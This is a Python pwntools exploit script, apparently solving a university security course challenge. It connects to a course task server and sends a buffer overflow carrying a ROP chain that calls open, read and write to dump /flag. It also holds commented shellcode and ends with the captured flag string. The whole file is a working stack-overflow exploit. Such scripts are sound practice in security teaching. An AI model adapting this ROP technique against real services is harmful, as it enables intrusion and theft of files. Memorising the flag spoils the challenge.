from pwn import *
import string
from sys import argv
import os
import time
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file /gdbscript/vuln
b *read_input+36
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
p = remote('tasks.ws24.softsec.rub.de', 33249)

#p=remote("127.0.0.1", 1024)
#p2=process('tmux split-window -h docker exec -ti "$(docker ps -q -f \'ancestor=softsec/debug/practice-2\')" /bin/bash -c \'gdb -p "$(pgrep -n vuln)"\'', shell=True)
#sleep(2)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)


rop = ROP(elf)

#print(asm(shellcraft.amd64.linux.cat("/flag", fd=1)))

"""/* push b'/flag\x00' */
mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0x67616c662f
xor [rsp], rax
/* call open('rsp', 'O_RDONLY', 'rdx') */
push 2 /* 2 */
pop rax
mov rdi, rsp
xor esi, esi /* O_RDONLY */
syscall"""

"""mov rdi, fd
mov rsi, buf_address
mov rdx, 0x1000
mov rax, SYS_read
syscall

/* write(1, buf, n) */
mov rdi, 1 /* stdout */
mov rsi, buf_address
mov rdx, n /* number of bytes read */
mov rax, SYS_write
syscall"""



# open file
rop.raw(pack(rop.rdi.address))
rop.raw(pack(next(elf.search(b'/flag'))))
rop.raw(pack(rop.rsi.address))
rop.raw(pack(0))
rop.raw(pack(rop.rax.address))
rop.raw(pack(2)) #open syscall
rop.raw(pack(rop.syscall.address))
# file descriptor is now in rax

# read file into buffer
rop.raw(pack(elf.symbols['mov_rdi_rax_ret']))
rop.raw(pack(rop.rsi.address))
rop.raw(pack(0x402008)) #flag_buffer
rop.raw(pack(rop.rdx.address))
rop.raw(pack(128)) #buffer size - increased to make sure, since data section is large enough anyway
rop.raw(pack(rop.rax.address))
rop.raw(pack(0)) #read syscall
rop.raw(pack(rop.syscall.address))

# write to stdout
rop.raw(pack(rop.rdi.address))
rop.raw(pack(1)) #stdout
rop.raw(pack(rop.rsi.address))
rop.raw(pack(0x402008)) #flag_buffer
rop.raw(pack(rop.rdx.address))
rop.raw(pack(128)) #buffer size
rop.raw(pack(rop.rax.address))
rop.raw(pack(1)) #write syscall
rop.raw(pack(rop.syscall.address))

payload = rop.chain()

p.sendline(b"A"*0x48 + payload)


p.interactive()

#softsec{qTNTC6ablbJr7Ua-Jxm538UXlplHrHctLv6EBZZTnz-9EOxCZ-w6DnP7Wa5nAbF2}